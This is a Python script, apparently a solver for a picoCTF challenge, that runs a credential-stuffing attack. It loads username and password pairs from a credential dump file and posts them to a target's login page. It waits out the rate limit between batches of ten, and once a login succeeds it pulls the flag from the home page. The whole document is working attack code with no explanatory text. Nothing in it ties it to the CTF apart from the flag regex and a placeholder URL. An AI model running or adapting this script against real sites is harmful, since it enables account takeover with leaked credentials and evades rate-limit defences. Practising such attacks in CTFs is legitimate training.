import requests
import time
import re
import sys
TARGET     = 'URL'
BATCH_SIZE = 10 #request size
SLEEP      = 32 # interval
creds = []
with open('creds-dump (1).txt') as f:
    for line in f:
        user, pw = line.strip().split(';', 1)
        creds.append((user, pw))
batch_count = 0
i = 0
print(f'[*] Loaded {len(creds)} credential pairs')
while i < len(creds):
    user, pw = creds[i]
    if batch_count == BATCH_SIZE:
        print(f'\n[*] Waiting {SLEEP}s for reset...\n')
        time.sleep(SLEEP)
        batch_count = 0
    batch_count += 1
    print(f'[TRY] {user}:{pw}')
    with requests.Session() as s:
        r = s.post(
            f'{TARGET}/login',
            data={'username': user, 'password': pw},
            allow_redirects=False
        )
        if r.status_code in (301, 302):
            print(f'\n[SUCCESS] {user}:{pw}')
            home = s.get(f'{TARGET}/')
            flag = re.search(r'picoCTF\{[^}]+\}', home.text)
            if flag:
                print(f'[FLAG] {flag.group(0)}')
            sys.exit(0)
    i += 1
